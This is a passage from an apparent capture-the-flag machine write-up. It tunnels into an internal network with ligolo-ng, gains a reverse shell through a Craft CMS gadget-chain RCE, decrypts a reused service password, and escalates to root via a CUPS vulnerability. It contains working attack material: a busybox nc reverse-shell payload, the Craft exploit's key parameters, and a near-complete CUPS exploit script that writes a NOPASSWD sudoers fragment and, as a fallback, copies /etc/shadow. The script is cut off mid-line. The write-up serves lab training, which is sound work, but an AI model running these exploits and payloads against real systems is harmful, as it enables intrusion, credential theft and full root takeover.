### 6.2 Acquire and stage the ligolo-ng binaries:

**Why this step:** Kali has no route to `10.13.37.0/24`; the portal is only reachable from the pivot. ligolo-ng builds an L3 tunnel so Kali's own tools and browser reach the internal net directly. It needs a `proxy` on Kali and an `agent` on the pivot.

**Command:**

```bash
# On Kali:
mkdir -p ~/ligolo && cd ~/ligolo
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
tar xf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz
tar xf ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
ls -l proxy agent
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`wget .../ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz`|The controller binary, run on Kali (x86-64). Note the version tag is `v0.9.2`, not `v0.92`; the wrong tag returns 404.|
|`wget .../ligolo-ng_agent_0.9.2_linux_amd64.tar.gz`|The relay binary; `linux_amd64` matches the Ubuntu x86-64 target.|
|`tar xf ...`|Extract each archive, yielding the `proxy` and `agent` executables.|

**Result:**

```
-rwxr-xr-x 1 nedmoeca nedmoeca  7164088 Sep 26 04:04 agent
-rwxr-xr-x 1 nedmoeca nedmoeca 21242040 Sep 26 04:07 proxy
```

**What this gives you:** Key finding: both ligolo-ng binaries staged on Kali, ready to deploy.

**Next:** Start the proxy on Kali and create the TUN interface it will route through.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.3 Start the ligolo proxy (as root) and create the TUN interface:

**Why this step:** The proxy manages a virtual TUN interface and kernel routes, which requires `CAP_NET_ADMIN`. Running it as root is necessary; an unprivileged proxy cannot add the route and fails with "operation not permitted."

**Command:**

```bash
# On Kali:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
cd ~/ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip tuntap add user $(whoami) mode tun ligolo`|Create a virtual TUN interface named `ligolo`; traffic routed to it is handed to the proxy process.|
|`ip link set ligolo up`|Bring the interface up so routes can point at it.|
|`sudo ./proxy`|Run the controller as root so it can create/destroy the interface and install routes.|
|`-selfcert`|Auto-generate a self-signed TLS certificate for the agent-to-proxy tunnel.|
|`-laddr 0.0.0.0:11601`|Listen on all interfaces, port 11601, for the agent's reverse connection.|

**Result:**

```
INFO[0000] Listening on 0.0.0.0:11601
         __    _             __
        / /   (_)___ _____  / /___        ____  ____ _
       Version: 0.9.2
ligolo-ng »
```

**What this gives you:**

Key findings:

- Proxy running as root and listening on 11601, at an interactive `ligolo-ng »` console.
- Running it unprivileged earlier produced `Could not add route ... operation not permitted` and a non-functional tunnel; root resolves this.

**Next:** Transfer the agent to the pivot and connect it back to this proxy.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.4 Deploy and connect the agent from the pivot:

**Why this step:** The agent must run on airside-ws01 and connect outbound to the proxy on Kali. The outbound control connection rides eth0/VPN, which is allowed; only the data routes are kept off eth0.

**Command:**

```bash
# On Kali (separate terminal): serve the agent
cd ~/ligolo && python3 -m http.server 8000

# On airside-ws01 (reverse shell):
cd /tmp
wget http://KALI_TUN0_IP:8000/agent -O agent
chmod +x agent
./agent -connect KALI_TUN0_IP:11601 -ignore-cert
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -m http.server 8000`|Temporary web server on Kali to deliver the agent binary.|
|`wget .../agent -O agent`|Fetch the binary onto the pivot.|
|`./agent -connect KALI_TUN0_IP:11601`|Connect the agent outbound to the proxy over Kali's tun0.|
|`-ignore-cert`|Accept the proxy's self-signed certificate.|

**Result:**

```
# pivot:
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established       addr="KALI_TUN0_IP:11601"

# proxy console:
INFO Agent joined.   id=020000000200 name=root@airside-ws01 remote="TARGET_IP:34454"
```

**What this gives you:** Key finding: agent connected; session `root@airside-ws01` available in the proxy. The agent auto-reconnects if the proxy restarts.

**Next:** Select the session and autoroute the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.5 Autoroute the internal subnet and start the tunnel:

**Why this step:** The agent is connected but no traffic flows until Kali has a route for the internal net pointing at the tunnel. Select only the internal `/24`; routing the external/VPN subnet back through the tunnel would loop the connection and drop it.

**Command (ligolo-ng proxy console):**

```
session
1
autoroute
# select ONLY 10.13.37.0/24 (space), then:
#   Use an existing one -> ligolo -> Start the tunnel? Yes
```

Pre-step on Kali if the VPN pushed a competing route:

```bash
sudo ip route del 10.13.37.0/24     # remove the "via 10.10.14.1 dev tun0" route first
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`session` / `1`|Select the active agent session.|
|`autoroute`|Read the agent's interfaces and offer their subnets as routes to install on Kali.|
|select `10.13.37.0/24` only|Route just the internal net through the tunnel.|
|leave `10.159.x.x` unselected|That is eth0/VPN; routing it through the tunnel creates a loop that kills the session.|
|`ip route del 10.13.37.0/24`|The HTB VPN pushes `10.13.37.0/24 via 10.10.14.1 dev tun0`; delete it so the ligolo route wins.|

**Result:**

```
INFO Creating routes for ligolo...
? Start the tunnel? Yes
INFO Starting tunnel to root@airside-ws01 (020000000200)
```

**What this gives you:**

Key findings:

- Tunnel started with the internal `/24` routed through the `ligolo` interface.
- The route-add succeeded only with the proxy running as root (the unprivileged attempt failed), and only after deleting the VPN-pushed `10.13.37.0/24` route.

**Next:** Verify the route and prove reachability to the portal from Kali.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 6.6 Verify reachability and add the hostname:

**Why this step:** Confirm the tunnel actually carries traffic before relying on it, and map the portal hostname so Craft's login and the exploit can address it by name.

**Command:**

```bash
ip route | grep 10.13.37
ping -c 2 10.13.37.10
curl -s -I http://10.13.37.10/
echo "10.13.37.10  portal.international.htb wifi.international.htb" | sudo tee -a /etc/hosts
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip route \| grep 10.13.37`|Confirm the route points at `dev ligolo`, not `via ... dev tun0`.|
|`ping -c 2 10.13.37.10`|ICMP rides ligolo's L3 tunnel (a SOCKS proxy could not carry this), proving the pivot works.|
|`curl -s -I http://10.13.37.10/`|Confirm the internal web server answers from Kali.|
|`echo ... \| sudo tee -a /etc/hosts`|Resolve `portal.international.htb` to the internal IP locally (no internal DNS over the tunnel).|

**Result:**

```
10.13.37.0/24 dev ligolo

64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=351 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=241 ms

HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Content-Length: 14221
```

**What this gives you:**

Key findings:

- Route confirmed `dev ligolo`; Kali reaches `10.13.37.10` by ICMP and HTTP through the tunnel (ttl 64, HTTP 200 from nginx).
- Added latency (~295 ms vs 0.3 ms from the pivot directly) reflects the extra Kali-to-pivot round trip and is expected.
- `portal.international.htb` now resolves locally on Kali to the internal portal.

**Next:** From Kali, browse the Craft CMS admin login and authenticate as jenny using the sniffed credentials, then identify the exact Craft version to confirm the RCE applies.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Web Exploitation: Craft CMS Authenticated RCE

### 7.1 Authenticate to the Craft control panel and confirm the version:

**Why this step:** With the tunnel up (Section 6) and sniffed credentials in hand (5.2), log into the Craft CP from Kali and read the exact version. The condition-config RCE requires both a CP-capable account and a vulnerable version (`< 5.10.6`).

**Action:**

```
# From the Kali browser:
http://portal.international.htb/admin/login
# Credentials: jenny / Fl1ghtDeck2026!
# After login, read the version from the CP footer (or Utilities -> System Report).
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`/admin/login`|Craft's control-panel login endpoint (distinct from the public Miles portal).|
|`jenny / Fl1ghtDeck2026!`|Credentials captured via wireless sniffing (5.2); reused here because jenny has CP access.|
|CP footer version string|Authoritative in-app version, used because the unauthenticated curl greps returned nothing.|

**Result:**

```
Logged in as jenny -> /admin/dashboard (CP access confirmed)
Footer: Craft CMS  SOLO  5.9.8
Dashboard notice: "One update available" / "Craft 5.10 Released"
```

![[layover_craft_dashboard_version.png]]

**What this gives you:**

Key findings:

- jenny has Craft control-panel access (reached `/admin/dashboard`), satisfying the "authenticated" requirement of the RCE.
- Craft version is **5.9.8**, which is below the fixed **5.10.6**, so the condition-config authenticated RCE applies. The in-app "update available / Craft 5.10 released" notice independently confirms the install is pre-patch.

###### How the Craft condition-config RCE works (theory):

Craft lets CP users define "element conditions" (rules that filter elements like entries or categories) as JSON, which Craft deserializes into live PHP objects via Yii's `Yii::createObject()`. The Yii framework supports attaching Behaviors to an object through an `as <name>` key and binding event handlers through an `on <event>` key. Because Craft does not sufficiently restrict the classes and keys in this user-supplied JSON, an authenticated attacker can attach a legitimate-but-abusable behavior (`yii\behaviors\AttributeTypecastBehavior`) whose "typecast" callable is pointed at a command-execution sink, and trigger it with a wildcard `on *` event handler. When Craft evaluates the condition, the event fires, the behavior runs the callable, and the attacker's command executes as the web user. This is a PHP object-injection gadget chain: the individual classes are benign, but chained through configuration they yield remote code execution.

**Next:** Prepare the exploit. Because the portal runs on the internal segment and cannot route to Kali, the reverse shell from www-data must call back to the pivot's wlan2 address (`10.13.37.183`), where a listener will be waiting, rather than to Kali.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.2 Trigger the RCE and catch a shell as www-data:

**Why this step:** jenny has CP access on vulnerable Craft 5.9.8 (7.1). Submit the Yii behavior gadget through the element-condition sink to execute a reverse-shell command as the web user. The callback targets the pivot (`10.13.37.183`), since the portal cannot route to Kali.

**Command:**

```bash
# On the pivot (airside-ws01): listener bound to its wlan2 address
nc -lvnp 4444

# On Kali: run the exploit over the ligolo tunnel
python3 craft_rce.py
```

Exploit script (`craft_rce.py`, key parameters):

```python
BASE  = "http://portal.international.htb"
USER  = "jenny"
PASS  = "Fl1ghtDeck2026!"
LHOST = "10.13.37.183"     # pivot wlan2 IP — listener lives here, NOT Kali
LPORT = 4444
# login -> fresh CP CSRF -> POST crafted condition to
#   /index.php?p=admin/actions/element-search/search
# gadget: "as rce" => yii\behaviors\AttributeTypecastBehavior
#         typecast sink => Psy\Readline\Hoa\ConsoleProcessus::execute(cmd)
#         "on *" => self::beforeSave  (fires on any event)
# tries shells in order: busybox nc / ncat / nc / python3
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nc -lvnp 4444` on the pivot|Catches the reverse shell at `10.13.37.183:4444`, the only listener address the portal can reach.|
|login + fresh CP CSRF|Craft actions require a valid CSRF token; the script logs in as jenny and reads a current token from the CP.|
|`"as rce": AttributeTypecastBehavior`|Attaches the abusable Yii behavior to the condition's field layout.|
|typecast => `ConsoleProcessus::execute`|Points the behavior's typecast callable at a command-execution sink bundled with Craft's dependencies.|
|`"on *": self::beforeSave`|Wildcard event handler so the behavior fires as soon as Craft evaluates the condition.|
|POST to `element-search/search`|The reachable admin action that deserializes the attacker-controlled condition JSON.|
|shell list (busybox/ncat/nc/python3)|Tries multiple one-liners; the first that connects hangs the HTTP request (a timeout = success).|

**Result:**

```
# Kali:
[+] logged in as jenny
[+] timeout (shell probably running): busybox nc 10.13.37.183 4444 -e /bin/sh
[*] check your listener on the pivot host

# Pivot listener:
Connection received on 10.13.37.10 54246
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
portal
```

**What this gives you:**

Key findings:

- Remote code execution achieved as `www-data` on host `portal` (`10.13.37.10`), the internal Craft server.
- The reverse shell correctly returned to the pivot (`10.13.37.183`), confirming the internal-callback requirement; the `busybox nc -e` payload succeeded first.
- A request timeout on the Kali side is the expected success indicator (the PHP worker blocks while running the shell).

**Next:** From the www-data shell, read Craft's `.env` for the security key and database credentials, then locate where the custom Miles module stores the encrypted mail-relay password.
<div align="center">
<br>
<br>
</div>
###### Stabilize the www-data shell:

**Why this step:** The caught shell is a raw `busybox nc -e /bin/sh` with no PTY, so `su`, job control, and line editing misbehave. Upgrade it to a proper bash PTY before post-exploitation enumeration on the portal.

**Command:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || script -qc /bin/bash /dev/null
export TERM=xterm
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Allocate a pseudo-terminal and run bash in it, giving the shell a controlling TTY.|
|`2>/dev/null \| script -qc /bin/bash /dev/null`|If python3 is absent on the target, fall back to `script`, which also allocates a PTY, discarding its typescript to `/dev/null`.|
|`export TERM=xterm`|Set the terminal type so screen-drawing programs render correctly.|

**Result:**

```
www-data@portal:~/portal/web$
```

(Prompt now shows a proper `www-data@portal` bash prompt; the python3 path succeeded.)

**What this gives you:** Key finding: a usable interactive bash shell as www-data on the portal, suitable for database queries and the decrypt step.

**Next:** Move to Craft's web root and confirm the layout (`.env`, `modules/`, `craft` CLI) before reading secrets.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.3 Read Craft's environment secrets

**Why this step:** With code execution as www-data (7.2), the next move is to recover credentials for a real user. Craft stores its master encryption key and database credentials in `.env`; both are needed to decrypt secrets held in the database.

**Command:**

```bash
cat /var/www/portal/.env
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`cat /var/www/portal/.env`|Read Craft's environment file, which holds configuration and secrets injected at runtime (the Twelve-Factor pattern).|

**Result (secret values scrubbed):**

```
CRAFT_ENVIRONMENT=production
CRAFT_SECURITY_KEY=<REDACTED_SECURITY_KEY>
CRAFT_ALLOW_ADMIN_CHANGES=false
CRAFT_ENABLE_TWIG_SANDBOX=true
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=craft
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=<REDACTED_DB_PASSWORD>
```

**What this gives you:**

Key findings:

- `CRAFT_SECURITY_KEY` recovered: the master key Craft/Yii uses to encrypt and decrypt stored data. Required to decrypt the mail-relay password blob.
- Database credentials recovered: `craftuser` on local MySQL (`127.0.0.1:3306`), database `craft`. These give read access to Craft's tables.
- Hardening flags `CRAFT_ALLOW_ADMIN_CHANGES=false` and `CRAFT_ENABLE_TWIG_SANDBOX=true` are set, which rules out admin-settings tampering and Twig template injection as alternate paths and confirms the database-decryption route.

**Next:** Locate the custom Miles module's settings table in the database and pull the encrypted mail-relay credentials, then decrypt the password using Craft's own security component.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.4 Pull the encrypted mail-relay credentials from the database

**Why this step:** With DB credentials from `.env` (7.3), query the custom Miles module's settings table. The module stores a service account's credentials, and service-account passwords are a common reuse vector onto a real system user.

**Command:**

```bash
mysql -u craftuser -p'<DB_PASS>' craft -e "show tables like '%htbairways%';"
mysql -u craftuser -p'<DB_PASS>' craft -e "select name,value from htbairways_settings;"
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`mysql -u craftuser -p'<DB_PASS>' craft`|Connect to the `craft` database as the user recovered from `.env`.|
|`show tables like '%htbairways%'`|Confirm the custom module's settings table name rather than assuming it.|
|`-e "select name,value from htbairways_settings;"`|Dump the module's stored settings, including the mail-relay account.|

**Result (password blob scrubbed):**

```
+--------------------------------+
| Tables_in_craft (%htbairways%) |
+--------------------------------+
| htbairways_settings            |
+--------------------------------+

+-------------------+-----------------------------------------------------+
| name              | value                                               |
+-------------------+-----------------------------------------------------+
| mailRelayPassword | <REDACTED_BASE64_ENCRYPTED_BLOB>                    |
| mailRelayHost     | mail.htbairways.htb                                 |
| mailRelayPort     | 587                                                 |
| mailRelayUser     | aporter                                             |
+-------------------+-----------------------------------------------------+
```

**What this gives you:**

Key findings:

- Mail-relay username is **`aporter`**, a candidate real-system user.
- `mailRelayPassword` is a base64-encoded, Craft-encrypted blob, not plaintext; it must be decrypted with the security key from `.env`.
- `mailRelayHost` / `mailRelayPort` (`mail.htbairways.htb:587`) are SMTP settings, not directly useful for access.

**Next:** Decrypt the blob using Craft's own security component (seeded with the `.env` security key) via the bundled `craft` CLI, avoiding any manual AES/HMAC reconstruction.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.5 Decrypt the mail-relay password with Craft's own crypto

**Why this step:** The `mailRelayPassword` from the database (7.4) is Craft-encrypted. Rather than reimplement Yii's AES-256-CBC + HMAC + PBKDF2 scheme, use the running Craft application (which already holds the security key from `.env`) to decrypt its own data.

**Command:**

```bash
cd /var/www/portal
php craft exec "echo Craft::\$app->security->decryptByKey(base64_decode('<BASE64_BLOB>')), PHP_EOL;"
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`php craft exec "<php>"`|Run arbitrary PHP inside the fully bootstrapped Craft app, so the Yii container, config, and `.env` security key are all loaded.|
|`Craft::\$app->security->decryptByKey(...)`|Craft's native decrypt method; handles HMAC verification, IV extraction, and AES decryption internally. `\$` is escaped so bash does not expand it.|
|`base64_decode('<BASE64_BLOB>')`|The stored value is base64; decode to the raw ciphertext bytes the method expects.|
|`PHP_EOL`|Append a newline for clean output.|

**Result (plaintext scrubbed):**

```
Output:
<REDACTED_RELAY_PASSWORD>
```

**What this gives you:**

Key findings:

- The mail-relay password decrypts to a plaintext string (the SMTP password for `aporter`).
- Because service-account passwords are frequently reused, this is the candidate login password for the system user `aporter`.

**Next:** Authenticate as `aporter` over SSH from Kali (port 22 was open externally) using the decrypted password, and read the user flag.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.6 Authenticate as aporter over SSH

**Why this step:** The decrypted mail-relay password (7.5) is a reuse candidate for the system user `aporter`. SSH in to convert www-data code execution into a stable, legitimate user session and reach the user flag. The portal (`10.13.37.10`) is internal, so SSH routes through the ligolo tunnel, not the external IP.

**Command:**

```bash
ssh aporter@10.13.37.10
# password: <decrypted relay password from 7.5>
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ssh aporter@10.13.37.10`|Connect to the internal portal's SSH service through the ligolo tunnel. The external target IP is the workstation (airside-ws01), where aporter has no account; aporter is a local user on the portal, so the internal address is required.|
|password reuse|The mail-relay password doubles as aporter's system login, confirming the service-account reuse hypothesis.|

**Result:**

```
aporter@10.13.37.10's password:
aporter@portal:~$ id
uid=1001(aporter) gid=1001(aporter) groups=1001(aporter)
aporter@portal:~$ hostname
portal
```

**What this gives you:**

Key findings:

- Interactive SSH session as `aporter` on host `portal`, a stable foothold replacing the www-data reverse shell.
- Password reuse confirmed: the decrypted mail-relay password authenticates aporter over SSH.
- Attempting this against the external IP fails (aporter is not a user on the workstation); the login succeeds only against the internal portal via the tunnel.

**Next:** Read the user flag, then enumerate the portal for a privilege-escalation path to root.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 7.7 Capture the user flag

**Command:**

```bash
cat ~/user.txt
```

**Result:**

```
ef28e95e04d9d56ea2a56c437107e43a
```

==USER FLAG:== `ef28e95e04d9d56ea2a56c437107e43a`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 8. Privilege Escalation (Portal): CUPS CVE-2026-34990 → root

### 8.1 Enumerate for a local privilege-escalation vector

**Why this step:** With a stable session as aporter (7.6), enumerate standard local-privesc vectors, checking sudo rights first and then local listening services for an exploitable daemon.

**Command:**

```bash
sudo -l 2>/dev/null
ss -tulpn 2>/dev/null | grep -E '631|LISTEN'
cups-config --version 2>/dev/null
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo -l`|List any sudo privileges for aporter; the fastest potential win.|
|`ss -tulpn \| grep LISTEN`|List all listening TCP/UDP sockets with owning processes, to find locally exposed services.|
|`cups-config --version`|Report the installed CUPS version, needed to match it against known CVEs.|

**Result:**

```
# sudo -l : (no rules returned — aporter has no sudo access)

tcp LISTEN 0 511        0.0.0.0:80     0.0.0.0:*
tcp LISTEN 0 4096       0.0.0.0:22     0.0.0.0:*
tcp LISTEN 0 4096     127.0.0.1:631    0.0.0.0:*
tcp LISTEN 0 80       127.0.0.1:3306   0.0.0.0:*
tcp LISTEN 0 4096        [::1]:631       [::]:*

# cups-config --version
2.4.16
```

**What this gives you:**

Key findings:

- aporter has no sudo rights, ruling out a sudo-based escalation.
- CUPS (Common UNIX Printing System) is listening on `127.0.0.1:631` and `[::1]:631` (loopback only), accessible to local processes such as aporter's session.
- CUPS version is **2.4.16**, which is vulnerable to CVE-2026-34990 (fixed in 2.4.17).
- Other local services (nginx `:80`, ssh `:22`, MySQL `:3306`, systemd-resolved `:53`) are the portal's normal stack and not escalation vectors here.

**Next:** Exploit CVE-2026-34990 by leaking the CUPS local admin token via a fake IPP listener, then racing a `file://` print queue into persistence to write a root-owned `/etc/sudoers.d` fragment.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 8.2 Exploit CVE-2026-34990 to write a root-owned sudoers fragment

**Why this step:** CVE-2026-34990 is a local attack against `127.0.0.1:631`, so the exploit must run on the portal itself as aporter, not from Kali. The script is created directly on the target with `vi` to avoid transfer dependencies and paste-mangling.

**Stage the exploit script on the target:** 

**Command:**

```bash
vi cups_root.py
```

```python
#!/usr/bin/env python3
"""CVE-2026-34990 -> root. Run ON THE VICTIM as the unprivileged user (aporter).
Captures cupsd's Local admin token via a fake localhost IPP printer, then races
a temporary file:// queue into persistence and prints our payload into it
(root file overwrite). Stage 1: /etc/sudoers.d fragment. Stage 2: /etc/cron.d."""
import gzip, os, socket, struct, subprocess, sys, threading, time
ATTACKER = sys.argv[1] if len(sys.argv) > 1 else "aporter"
CAPTURE_HOST, CAPTURE_PORT = "127.0.0.1", 9189
IPP_HOST, IPP_PORT = "127.0.0.1", 631
T_OP, T_PRINTER, T_END = 0x01, 0x04, 0x03
T_INT, T_BOOL, T_NAME, T_KEYWORD = 0x21, 0x22, 0x42, 0x44
T_URI, T_CHARSET, T_LANG, T_MIME = 0x45, 0x47, 0x48, 0x49
OP_PRINT_JOB, OP_RESUME = 0x0002, 0x0011
OP_ADDMOD, OP_ACCEPT, OP_CREATE_LOCAL, OP_DELETE = 0x4003, 0x4008, 0x4028, 0x4004
def a(tag, name, val):
    n, v = name.encode(), val.encode()
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
def a_raw(tag, name, v):
    n = name.encode()
    return bytes([tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v
def ab(name, val):  return a_raw(T_BOOL, name, b"\x01" if val else b"\x00")
def req(op, rid, oa, pa=None, doc=b""):
    p = bytearray(struct.pack(">BBHI", 2, 0, op, rid)); p.append(T_OP)
    for x in oa: p.extend(x)
    if pa:
        p.append(T_PRINTER)
        for x in pa: p.extend(x)
    p.append(T_END); p.extend(doc)
    return bytes(p)
def post(res, body, auth=None, timeout=4.0):
    h = [f"POST {res} HTTP/1.1", f"Host: {IPP_HOST}:{IPP_PORT}",
         "Content-Type: application/ipp", f"Content-Length: {len(body)}", "Connection: close"]
    if auth: h.append(f"Authorization: Local {auth}")
    raw = ("\r\n".join(h) + "\r\n\r\n").encode("latin1") + body
    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=timeout) as s:
        s.settimeout(timeout); s.sendall(raw)
        buf = bytearray()
        while b"\r\n\r\n" not in buf:
            c = s.recv(65536)
            if not c: break
            buf.extend(c)
        hh, _, rest = bytes(buf).partition(b"\r\n\r\n")
        cl = 0
        for ln in hh.split(b"\r\n"):
            if ln.lower().startswith(b"content-length:"):
                cl = int(ln.split(b":", 1)[1].strip())
        pl = bytearray(rest)
        while len(pl) < cl:
            c = s.recv(65536)
            if not c: break
            pl.extend(c)
        sl = hh.split(b"\r\n", 1)[0].split()
        return (int(sl[1]) if len(sl) > 1 else 0), bytes(pl[:cl] if cl else pl)
def st(p): return struct.unpack(">H", p[2:4])[0] if len(p) >= 4 else -1
def common():
    return [a(T_CHARSET, "attributes-charset", "utf-8"),
            a(T_LANG, "attributes-natural-language", "en"),
            a(T_NAME, "requesting-user-name", ATTACKER)]
def admin(tok, op, rid, name, pa=None):
    c, p = post("/admin/", req(op, rid, common() +
                [a(T_URI, "printer-uri", f"ipp://localhost:631/printers/{name}")], pa), auth=tok)
    return c, st(p)
def print_job(name, rid, payload):
    c, p = post(f"/printers/{name}", req(OP_PRINT_JOB, rid,
                common() + [a(T_URI, "printer-uri", f"ipp://localhost:631/printers/{name}"),
                            a(T_MIME, "document-format", "application/vnd.cups-raw"),
                            a(T_KEYWORD, "compression", "gzip"),
                            a(T_NAME, "job-name", "pwn")], doc=gzip.compress(payload)))
    return c, st(p)
def create_local(sock_holder, name, target, rid):
    body = req(OP_CREATE_LOCAL, rid, common() + [a(T_URI, "printer-uri", "ipp://localhost:631/")],
               [a(T_NAME, "printer-name", name), a(T_URI, "device-uri", f"file://{target}")])
    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
    sk = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4)
    sk.sendall(raw); sock_holder.append(sk)
    return sk
class Cap(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True); self.port, self.token = port, None
    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((CAPTURE_HOST, self.port)); s.listen(5); s.settimeout(0.2)
            end = time.time() + 12
            while time.time() < end and not self.token:
                try: c, _ = s.accept()
                except socket.timeout: continue
                with c:
                    d = b""; c.settimeout(5)
                    while b"\r\n\r\n" not in d:
                        x = c.recv(4096)
                        if not x: break
                        d += x
                    tok = None
                    for ln in d.decode("latin1", "replace").splitlines():
                        if ln.lower().startswith("authorization: local "):
                            tok = ln.split(None, 2)[2]
                    if tok:
                        self.token = tok
                        ipp = (b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                               b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                               b"\x48\x00\x1battributes-natural-language\x00\x02en\x03")
                        c.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\nContent-Length: "
                                  + str(len(ipp)).encode() + b"\r\nConnection: close\r\n\r\n" + ipp)
                    else:
                        c.sendall(b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Local trc=\"y\"\r\n"
                                  b"Content-Length: 0\r\nConnection: close\r\n\r\n")
def race_write(tok, name, payload, seconds=6.0):
    rid = 0; end = time.time() + seconds
    while time.time() < end:
        rid += 1
        admin(tok, OP_ADDMOD, 1000 + rid, name,
              [a(T_NAME, "ppd-name", "raw"), ab("printer-is-shared", True)])
        admin(tok, OP_ACCEPT, 2000 + rid, name)
        admin(tok, OP_RESUME, 3000 + rid, name)
        hc, hs = print_job(name, 4000 + rid, payload)
        if hc == 200 and hs in (0x0000, 0x0001):
            return True
        time.sleep(0.05)
    return False
def is_root():
    r = subprocess.run(["sudo", "-n", "/bin/sh", "-c", "id"], capture_output=True, text=True)
    return r.returncode == 0, (r.stdout + r.stderr).strip()
def stage(tok, tag, path, payload, tries=12):
    for i in range(tries):
        name = f"{tag}{i}{time.time_ns() % 100000}"
        holder = []
        create_local(holder, name, path, 7000 + i)
        won = race_write(tok, name, payload)
        for sk in holder:
            try: sk.close()
            except Exception: pass
        print(f"    [{tag}] attempt {i}: race={'won' if won else 'lost'}", flush=True)
        if os.path.exists(path):
            admin(tok, OP_DELETE, 9000 + i, name)
            return True
        time.sleep(0.3)
    return False
def main():
    cap = Cap(CAPTURE_PORT); cap.start(); time.sleep(0.4)
    body = req(OP_CREATE_LOCAL, 3, common() + [a(T_URI, "printer-uri", "ipp://localhost:631/")],
               [a(T_NAME, "printer-name", "tokenleak"),
                a(T_URI, "device-uri", f"ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print")])
    raw = (f"POST / HTTP/1.1\r\nHost: {IPP_HOST}:{IPP_PORT}\r\nContent-Type: application/ipp\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode("latin1") + body
    s = socket.create_connection((IPP_HOST, IPP_PORT), timeout=4); s.sendall(raw)
    s.settimeout(2)
    try: s.recv(4096)
    except Exception: pass
    s.close(); cap.join(timeout=12)
    if not cap.token:
        print("[-] no token captured"); return 1
    print("[+] Local token:", cap.token, flush=True)
    print("[*] stage 1: /etc/sudoers.d fragment", flush=True)
    if stage(cap.token, "sw", f"/etc/sudoers.d/{ATTACKER}-pwn",
             f"{ATTACKER} ALL=(ALL) NOPASSWD: ALL\n".encode()):
        ok, out = is_root(); print(f"[*] sudo -n id -> {out}", flush=True)
        if ok:
            print("[+] ROOT via sudoers"); return 0
    print("[*] stage 2: /etc/cron.d fallback", flush=True)
    if stage(cap.token, "cw", f"/etc/cron.d/{ATTACKER}-pwn",
             f"* * * * * root cp /etc/shadow /tmp/shadow-{ATTACKER};"
